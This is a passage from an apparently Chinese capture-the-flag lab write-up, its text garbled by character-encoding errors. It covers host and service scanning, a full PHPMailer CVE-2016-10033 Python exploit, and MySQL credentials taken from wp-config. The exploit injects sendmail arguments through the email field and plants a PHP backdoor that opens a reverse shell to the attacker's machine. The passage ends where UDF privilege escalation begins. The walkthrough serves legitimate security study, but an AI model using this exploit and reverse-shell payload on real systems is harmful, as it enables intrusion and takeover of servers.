title="ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†"></a>ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†</h3><ul><li>é€šè¿‡netdiscoverè¿›è¡ŒäºŒå±‚å‘ç°ï¼Œå‘ç°åœ°å€ä¸º192.168.101.134ä¸»æœº</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.101.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102437077.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102437077.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>é€šè¿‡pingè¿›è¡Œä¸‰å±‚å‘ç°ï¼Œæ ¹æ®ttl&#x3D;64åˆæ­¥æ¨æµ‹è¯¥ä¸»æœºä¸ºLinux</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.134</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102542459.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102542459.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>é€šè¿‡masscanå››å±‚å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾ç«¯å£</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.134</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102724962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102724962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®æ ‡ä¸»æœºå¼€å¯äº†111æœåŠ¡ç«¯å£ï¼Œ22sshç«¯å£ï¼Œ49505ç«¯å£</p><ul><li><p>æ‰«æç›®æ ‡ç«¯å£æœåŠ¡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.134 -oN nmap.A</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102846814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102846814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>ç›®æ ‡å¼€å¯äº†ä»¥ä¸‹ç«¯å£åŠæœåŠ¡ï¼š<ul><li>22ç«¯å£ï¼ŒæœåŠ¡ä¸ºOpenSSH 6.7p1;ä¸”ç³»ç»Ÿä¸ºDebian 5+deb8u4</li><li>80ç«¯å£ï¼ŒæœåŠ¡ä¸ºApacha 2.4.10</li><li>111ç«¯å£ï¼ŒrpcbindæœåŠ¡</li></ul></li></ul><p>ä½¿ç”¨Nmapä¸­æ¼æ´åˆ†ç±»NSEè„šæœ¬å¯¹ç›®æ ‡è¿›è¡Œæ¢æµ‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.134</span><br></pre></td></tr></table></figure><hr><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626103151599.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626103151599.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŒæ ·å­˜åœ¨opensshçš„ç”¨æˆ·åæšä¸¾å’Œæ ˆæº¢å‡ºçš„SSV-90447å¯ç”¨</p><p>åœ¨exploit-dbä¸Šæœç´¢sshå¯¹åº”ç‰ˆæœ¬çš„æ¼æ´ï¼Œæˆ–è€…searchspolitï¼Œç›®æ ‡æœåŠ¡å™¨çš„opensshæœ‰ç”¨æˆ·åæšä¸¾æ¼æ´</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>seebugä¸Šçœ‹åˆ°ç›®æ ‡ä¸»æœºå­˜åœ¨ä¿¡æ¯æ³„éœ²å’Œç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œè¿˜æœ‰2010å¹´çš„æ‹’ç»æœåŠ¡æ¼æ´ï¼ˆå› è¯¥æ¼æ´ç­‰çº§è¾ƒä½ï¼Œå®æ–½æ‹’ç»æœåŠ¡ä¹Ÿè¾ƒå›°éš¾æ‰€ä»¥æ— è§†ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>&#x3D;&#x3D;192.168.101.134ä¸»æœºçš„22ç«¯å£å­˜åœ¨ä¿¡æ¯æ³„éœ²å’Œç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œseebugè¿˜æœ‰searchspolitéƒ½èƒ½æ‰¾åˆ°å¯¹åº”çš„pocï¼Œè¯¥è½®ä¿¡æ¯æ‰«æå¯ä»¥ç”¨æ¥è¿›è¡Œä¸‹ä¸€æ­¥çš„sshçˆ†ç ´æˆ–æº¢å‡ºæ¼æ´æ”»å‡»ã€‚è¯¥ä¿¡æ¯æ³„éœ²æ¼æ´å®šä¹‰ä¸ºä¸­å±&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è®¿é—®å…¶webæœåŠ¡ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨å…¶service.htmlæºç é‡Œæ‰¾åˆ°flag1:</p><p>&#x3D;&#x3D;flag1{b9bbcb33e11b80be759c4e844862482d}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>ç›®å½•æ‰«æï¼š</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®æ ‡ç½‘ç«™å­˜åœ¨vendorç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨æ•æ„Ÿç›®å½•éå†</p><blockquote><p>vendorç›®å½•ä¸€èˆ¬æ˜¯æŒ‡åœ¨é¡¹ç›®ä¸­ç”¨äºå­˜æ”¾ç¬¬ä¸‰æ–¹åº“ã€æ¡†æ¶ã€æ’ä»¶ç­‰å¤–éƒ¨ä¾èµ–çš„ç›®å½•ã€‚</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿˜æœ‰wordpressç›®å½•ï¼Œè¯¥ç«™åº”è¯¥æ˜¯ä¸€ä¸ªwordpressçš„æ¡†æ¶</p><ul><li>wappalzeråˆ†æï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨ç›®å½•å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†PHPMailer(åŠŸèƒ½é½å…¨çš„PHPç”µå­é‚®ä»¶åˆ›å»ºå’Œä¼ è¾“ç±»)</p><p>VERSIONç›®å½•æ‰¾åˆ°äº†PHPMailerç‰ˆæœ¬å·ä¸º5.2.16</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="ï¼ˆ2ï¼‰PHPMaileræ¼æ´æ”»å‡»"><a href="#ï¼ˆ2ï¼‰PHPMaileræ¼æ´æ”»å‡»" class="headerlink" title="ï¼ˆ2ï¼‰PHPMaileræ¼æ´æ”»å‡»"></a>ï¼ˆ2ï¼‰PHPMaileræ¼æ´æ”»å‡»</h3><p>æŸ¥æ‰¾å¯¹åº”çš„æ¼æ´ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit PHPMailer</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145538957.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145538957.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>PHPMaileer&lt;5.2.18å¯ä»¥è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä½¿ç”¨pythonç‰ˆå¯¹åº”çš„expï¼š</p><ul><li>æŠŠexpå¤åˆ¶åˆ°å½“å‰ç›®å½•ï¼š</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py ./</span><br></pre></td></tr></table></figure><ul><li>æ”»å‡»æœºkaliå¼€å¯ncç›‘å¬ï¼Œç«¯å£ä¸º4444</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><ul><li>ä¿®æ”¹expï¼ŒæŠŠtargetæ”¹ä¸ºç›®æ ‡åœ°å€ï¼Œbackdoorä¸ºå†™çš„shellåœ°å€ï¼Œä¿®æ”¹åå¼¹shellåœ°å€ä¸ºæœ¬æœºipï¼Œä¿®æ”¹åå¦‚ä¸‹ï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192523424.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192523424.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹‹æ‰€ä»¥åŠ contact.phpï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¯¥æ¼æ´æˆå› ï¼Œæ˜¯å› ä¸ºè¾“å…¥çš„é‚®ä»¶åœ°å€èƒ½åŒ…å«å¼•å·æ‹¬èµ·æ¥çš„ç©ºæ ¼ï¼Œé€ æˆå‚æ•°æ³¨å…¥ã€‚æ‰€ä»¥è¦æ‰¾æ¥æ”¶é‚®ä»¶å‚æ•°çš„é¡µé¢ã€‚å°±æ˜¯contact.php</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192319281.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192319281.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests_toolbelt <span class="keyword">import</span> MultipartEncoder</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html <span class="keyword">as</span> lh</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.101.134:80/contact.php&#x27;</span><span class="comment">#å­˜åœ¨æ¼æ´çš„ç›®æ ‡</span></span><br><span class="line">backdoor = <span class="string">&#x27;/godown.php&#x27;</span><span class="comment">#åé—¨ä½ç½®</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.101.128\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><span class="comment">#connectåˆ°kali ip</span></span><br><span class="line">fields=&#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/godown.php server\&quot; @protonmail.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Pwned&#x27;</span>&#125;<span class="comment">#OQueueDirectoryåŒæ­¥æ”¹ä¸ºshellåœ°å€</span></span><br><span class="line"></span><br><span class="line">m = MultipartEncoder(fields=fields,</span><br><span class="line">                     boundary=<span class="string">&#x27;----WebKitFormBoundaryzXJpHSq4mNy35tHe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;curl/7.47.0&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Content-Type&#x27;</span>: m.content_type&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;localhost:8081&#x27;</span>, <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;localhost:8081&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] SeNdiNG eVIl SHeLL To TaRGeT....&#x27;</span>)</span><br><span class="line">r = requests.post(target, data=m.to_string(),</span><br><span class="line">                  headers=headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D&#x27;</span>)</span><br><span class="line">r = requests.get(target+backdoor, headers=headers)</span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]  ExPLoITeD &#x27;</span> + target)</span><br></pre></td></tr></table></figure><blockquote><p>æä¸€äº›å…¶ä»–çš„çŸ¥è¯†ï¼švimå…¨é€‰å¤åˆ¶ï¼švVGy</p><p>vè¿›å…¥æ™®é€šå¯è§†æ¨¡å¼ï¼ŒVè¿›å…¥è¡Œå¯è§†æ¨¡å¼ï¼ŒGæŠŠå…‰æ ‡æ˜“æ‡‚åˆ°æœ€åä¸€è¡Œï¼Œyå¤åˆ¶é€‰ä¸­æ–‡æœ¬</p></blockquote><p>æ‰§è¡Œåæ˜¾ç¤ºå¦‚ä¸‹ç»“æœï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191222883.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191222883.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç°åœ¨è®¿é—®<a href="http://192.168.101.134/godown.php%EF%BC%88%E4%BD%A0%E6%89%80%E5%86%99shell%E4%BD%8D%E7%BD%AE%EF%BC%89%EF%BC%8C%E5%BC%B9%E5%9B%9Eshell">http://192.168.101.134/godown.phpï¼ˆä½ æ‰€å†™shellä½ç½®ï¼‰ï¼Œå¼¹å›shell</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191342876.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191342876.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191357449.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191357449.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>shellä¸ºwww-dataçš„æƒé™ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191418321.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191418321.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®æ ‡æœºæœ‰pythonç¯å¢ƒ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193135591.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193135591.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>ç”¨python ptyè·å–å®Œæ•´äº¤äº’å¼shell</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193203637.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193203637.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŸ¥æ‰¾flag2ï¼Œflag3:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag* 2&gt;/dev/null</span><br></pre></td></tr></table></figure><blockquote><p>åŠ ä¸Š<code>2&gt;/dev/null</code>æŠŠé”™è¯¯è¾“å‡ºä¸¢å¼ƒï¼Œä¸ç„¶ä¼šå‡ºç°æš´å¤šPermission deniedçš„æ— æƒé™æœç´¢ç›®å½•ä¿¡æ¯ã€‚</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193757457.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193757457.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>flag2:&#x3D;&#x3D;flag2{6a8ed560f0b5358ecf844108048eb337}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193853770.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193853770.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>flag3:ç½‘é¡µä¸ŠæŸ¥çœ‹</p><p>&#x3D;&#x3D;flag3{a0f568aa9de277887f37730d71520d9b}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194012468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194012468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="ï¼ˆ3ï¼‰Mysql-UDFææƒ"><a href="#ï¼ˆ3ï¼‰Mysql-UDFææƒ" class="headerlink" title="ï¼ˆ3ï¼‰Mysql UDFææƒ"></a>ï¼ˆ3ï¼‰Mysql UDFææƒ</h3><p>wordpressä¸‹æœ‰wordpressçš„é…ç½®æ–‡ä»¶wp-config.php</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194359329.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194359329.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ•°æ®åº“è´¦å·rootï¼Œå¯†ç R@v3nSecurity</p><p>ç™»å½•mysql:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -pR@v3nSecurity</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194517437.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194517437.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸”Server version(Mysql)ç‰ˆæœ¬ä¸º5.5.60ã€‚å¯ä»¥ç”¨udfææƒ</p><blockquote><p>udfææƒï¼šUDFææƒå‰ææ˜¯çŸ¥é“æ•°æ®åº“rootå¯†ç </p><ul><li>ä¸€èˆ¬æ¥è¯´mysql&gt;&#x3D;5.1.4 ä¸Šä¼ udfåˆ°mysql\lib\plugin</li><li>å¦‚æœmysql&lt;5.1.4 åˆ«æƒ³äº†ï¼Œé‡ä¸åˆ°</li></ul></blockquote><p>æŸ¥æ‰¾å¯¹åº”çš„expï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mysql</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628200305919.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628200305919.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠŠexpå¤åˆ¶åˆ°å½“å‰è·¯å¾„ï¼Œå¹¶gccç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span 